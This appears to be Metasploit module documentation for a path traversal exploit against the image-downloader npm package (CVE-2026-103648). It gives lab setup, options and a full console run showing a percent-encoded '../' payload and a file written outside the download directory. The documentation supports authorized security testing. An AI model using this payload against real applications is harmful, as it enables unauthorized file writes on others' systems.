## Vulnerable Application

The `image-downloader` npm package before version 4.3.1 is vulnerable to an
arbitrary file write through path traversal. Applications are affected when
they pass an attacker-controlled URL to `download.image({ url, dest })`.

The vulnerability occurs because the URL path is passed to `path.basename()`
before percent decoding. An encoded path traversal sequence can therefore
survive the basename check and be decoded before `path.join()` resolves the
destination path.

The module has been exercised against `image-downloader` version 4.3.0 using the
[CVE-2026-103648 lab](https://github.com/EterNullSec/CVE-2026-103648).
The lab should only be run in an isolated environment. A callback only confirms
that the target fetched the supplied URL; it does not independently prove the
package version, traversal, or final file location.

The vulnerable application can be started with Docker:

```
git clone https://github.com/EterNullSec/CVE-2026-103648.git
cd CVE-2026-103648
docker compose up --build
```

Alternatively, start it directly with Node.js 18 or later:

```
git clone https://github.com/EterNullSec/CVE-2026-103648.git
cd CVE-2026-103648/vulnerable-app
npm install
node server.js
```

The vulnerable server listens on port 3000 and exposes the download endpoint
at `/download?url=<image_url>`. Its configured download directory is
`/tmp/downloads/`. With that lab destination and the default `DEPTH=2`, the
encoded path resolves to `/tmp/pwned_by_msf.txt`. For other applications or
destinations, the final path depends on the configured download directory and
`DEPTH`; adjust `DEPTH` to match the target's configuration. The target
application performs the file write; the Metasploit module only serves the
callback response.

## Verification Steps

1. Start the vulnerable application using the instructions above.
1. Start `msfconsole`.
1. Run: `use auxiliary/admin/http/image_downloader_path_traversal`.
1. Run: `set RHOSTS <target host>`.
1. Run: `set RPORT 3000`.
1. Run: `set SRVHOST <listener address reachable by the target>`.
1. Run: `set SRVPORT 8899`.
1. Run: `run`.
1. Confirm that the module receives the target's request for the callback.
1. On the lab target, confirm that `/tmp/pwned_by_msf.txt` exists outside
   `/tmp/downloads/`. This exact path is specific to the lab's configured
   destination and default `DEPTH=2`.

Receiving the callback proves only that the target fetched the supplied URL.
It does not prove that path traversal succeeded or that the file was written
outside the configured destination. Verify the final path on the target before
considering the vulnerability confirmed.

## Options

### URLPARAM

The query-string parameter read by the target endpoint as the image URL. The
default value is `url`.

### DEPTH

The number of percent-encoded `../` traversal levels placed in the callback
URL. The default value is `2`.

### FILENAME

The filename included after the traversal sequence. The target application
performs the write; its final path depends on its configured download
directory and `DEPTH`. In the documented lab configuration, the default
filename is written to `/tmp/pwned_by_msf.txt`.

### CALLBACK_TIMEOUT

The number of seconds to wait for the target to request the payload from the
module's HTTP listener. The default value is `15`.

## Scenarios

### image-downloader 4.3.0 on Linux

The vulnerable lab server and Metasploit were run on the same host. When the
target is remote, `SRVHOST` and `SRVPORT` must identify a listener that the
target can reach.

```
msf6 > use auxiliary/admin/http/image_downloader_path_traversal
msf6 auxiliary(admin/http/image_downloader_path_traversal) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 auxiliary(admin/http/image_downloader_path_traversal) > set RPORT 3000
RPORT => 3000
msf6 auxiliary(admin/http/image_downloader_path_traversal) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(admin/http/image_downloader_path_traversal) > set SRVPORT 8899
SRVPORT => 8899
msf6 auxiliary(admin/http/image_downloader_path_traversal) > run

[*] Running module against 127.0.0.1
[*] Using URL: http://127.0.0.1:8899/
[*] Started payload listener on 127.0.0.1:8899
[*] Callback URL: http://127.0.0.1:8899/%2e%2e%2f%2e%2e%2ftmp%2fpwned_by_msf.txt
[*] Triggering /download with traversal payload: /%2e%2e%2f%2e%2e%2ftmp%2fpwned_by_msf.txt
[*] Payload fetched by 127.0.0.1 - GET /../../tmp/pwned_by_msf.txt
[+] Target fetched the callback payload.
[!] This confirms an outbound fetch only; it does not confirm path traversal or a file write.
[!] Verify the final file location locally on the target before treating it as vulnerable.
[*] Server stopped.
[*] Auxiliary module execution completed
```

For this lab configuration, verify the file on the target host:

```
$ cat /tmp/pwned_by_msf.txt
CVE-2026-103648 | image-downloader path traversal | EdzJNluX
```
